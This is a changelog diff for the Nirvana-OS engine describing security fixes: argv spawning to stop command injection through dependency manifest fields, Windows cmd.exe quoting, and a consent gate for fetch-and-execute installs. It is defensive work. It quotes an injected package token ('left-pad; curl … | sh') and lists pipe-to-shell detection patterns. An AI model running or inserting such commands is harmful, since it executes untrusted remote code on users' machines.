@@ -8,6 +8,118 @@ All notable changes to the Nirvana-OS engine. Versions map to GitHub releases
 
 ## Unreleased
 
+### A field that reads as data stops being able to run a command
+
+`dependencies.yaml` carries two kinds of field, and the activator ran both as a
+shell line. `system[].install.<platform>` is a shell line by design: the squad
+author writes `brew install ffmpeg` there, and sudo or a download over 1 GB
+stops at the consent gate first. `node:`, `python:`, `models[]` and the two
+`repo` fields are data. Package tokens, a repo, a url, a filename, a path. They were joined
+into a shell string too, so a manifest carrying
+`- "left-pad; curl https://x/y.sh | sh"`, or a model url with a `;` in it, ran a
+second command during `nrv activate`, with the user's own privileges and no gate
+in front of it. Wrapping the pip tokens in single quotes only moved the door,
+since an apostrophe inside a token closes them.
+
+`services[].repo` and `custom_nodes[].repo` were the last two, interpolated into
+a `git clone` line. Every one of these paths now spawns an argv array with no
+shell, so on macOS and Linux a token can only ever be one argument. `models[]`
+gains the quieter half of the same fix: an install path with a space in it used
+to split into two arguments. `install_cmd`, `start_cmd`, `health_check` and
+`post_install[]` are untouched — those are command by design, written by the
+squad author, and they stay shell lines.
+
+Windows needs one more step, and leaving it to the runtime is what made it
+dangerous. `pip`, `uv`, `curl` and `huggingface-cli` are real executables there,
+so those paths spawn directly, with no shell anywhere. `npm`, `pnpm` and `yarn`
+ship as `.cmd` shims that no runtime starts without a shell, and the runtime
+does not quote the token: libuv quotes an argument only when it holds a space,
+tab or double quote (`quote_cmd_arg`, `src/win/process.c`). So the command line
+is built by the activator now, with every argument quoted, and handed to the
+shell path as `cmd.exe /d /s /c "<line>"`, where `/s` strips the outer pair the
+runtime adds and leaves ours standing. `^`, `&`, `|`, `<`, `>`, `(` and `)` are
+data inside it. Four characters survive no quoting cmd.exe understands and are
+refused by name instead: `"`, `%`, `!` and a newline. No spec in any shipped
+pack carries one.
+
+That last part matters because of what the audit found. `@remotion/cli@^4.0.0`
+ships today in `creative-studio` and `genesis-circle`, it has no space, tab or
+double quote, and cmd.exe eats `^` as its own escape character: on Windows it
+was being installed as `@remotion/cli@4.0.0`. A different range, no error,
+nobody told. That is a correctness bug that lived alongside the security one,
+and quoting closes both. `system[].install` is untouched, and `--dry-run` now
+reports the `argv` it would spawn next to the display string.
+
+### Installing by fetching and executing now stops at the consent gate
+
+This one changes what you see when you run `nrv activate`, so it is worth
+reading before you update.
+
+`system[].install.<platform>` is a shell line by design, and the consent gate in
+front of it matched exactly one thing: `sudo`. Everything else ran. So
+`curl -fsSL https://bun.sh/install | bash`, which ships today in `brandcraft`
+and `grok-studio-nirvana`, executed a third party's script on the buyer's
+machine without asking anything, because someone said "install the
+dependencies". The exit-code contract already promised `2` for heavy installs;
+this fills a promise instead of inventing one.
+
+The gate now also stops a command that downloads something and runs it, in
+either of its two shapes. The direct one is a pipe or a substitution:
+`curl … | bash`, `| sh`, `| zsh` (with flags, redirections, or a `sudo -E` in
+between), `wget -qO- … | sh`, `bash <(curl …)`, `sh -c "$(curl …)"`,
+`eval "$(curl …)"`, and on PowerShell `iwr … | iex`, `irm … | iex`,
+`Invoke-WebRequest … | Invoke-Expression`. The two-step one is the commoner
+shape in the wild and has no pipe anywhere: fetch a remote url and, in the same
+command, run an interpreter or a downloaded path — `curl … -o /tmp/x.zip &&
+unzip … && sh /tmp/x/install`. `ebook-maestro-nirvana` ships exactly that today
+in `genesis-circle` and `publishing-knowledge`, to install veraPDF.
+
+The item comes back as `confirmation_required` with exit `2`, and the message
+names the exact command, the url it fetches, the interpreter that would run it,
+and **which of the two signals fired**. That distinction is deliberate: a pipe
+into a shell is not arguable, while a fetch and a runner in one command is a
+strong reading of it. The second says so, and asks you to read the command
+before accepting. `--confirm-heavy` is the same gesture that already accepted
+sudo and large downloads; nothing new to learn.
+
+Measured against every `system[].install` declaration in the packs (590 across
+340 manifests): 75 stop for a direct form, 5 for the two-step form (one distinct
+command, veraPDF), 145 keep stopping for sudo exactly as before, and 365 pass
+untouched.
+
+Downloading is not executing, and the difference is the point. `curl -o
+model.bin <url>`, `curl … | tar -xz`, `brew install`, `apt-get install`,
+`winget install` and `git clone` do not stop for anything. A gate that fires on
+ordinary installs is a gate everyone learns to pass without reading.
+
+### The paid overlay lands where the engine lives
+
+`install-content.ts` resolved `~/squads`, `~/businesses`,
+`~/businesses/_library/dna` and `~/.nirvana/packs` from `os.homedir()`, once, at
+module scope, while `installer.ts` honours `NIRVANA_HOME`, `SQUADS_DIR`,
+`BUSINESSES_DIR` and `DNA_LIBRARY`. Anyone whose Nirvana home is not the default
+got the engine in one place and the paid content in another. It also made the
+overlay untestable by environment: `os.homedir()` follows `$HOME` on macOS and
+Linux and `%USERPROFILE%` on Windows, which is why a test that redirected only
+`HOME` passed on two runners and wrote into the real profile on the third. The
+four roots are lazy now, and read the same variables `installer.ts` reads.
+
+### `nrv run-track list` prints the id that `close` takes
+
+The listing showed `project_id`, which is a directory basename. `beat` and
+`close` require the `run_id`, so the one command that discovers open runs handed
+over an identifier the two commands that act on them answer `not found` to, and
+the id had to be read out of the SQLite file by hand. Both are labelled columns
+now, because they are different things.
+
+### The READMEs catch up with the engine
+
+All six said "currently 0.8.1" while the engine was on 0.10.0, and none of them
+mentioned the two headline commands of that release. The status line reads
+0.10.0, and the command table gained a row for `nrv validate`, the admission
+gate for a squad, a business or a mind-clone, and one for `nrv migrate`, the
+conversion to Squad Protocol 6.0.
+
 ## 0.10.0 — 2026-08-27
 
 ### A project stops seeing other projects' runs
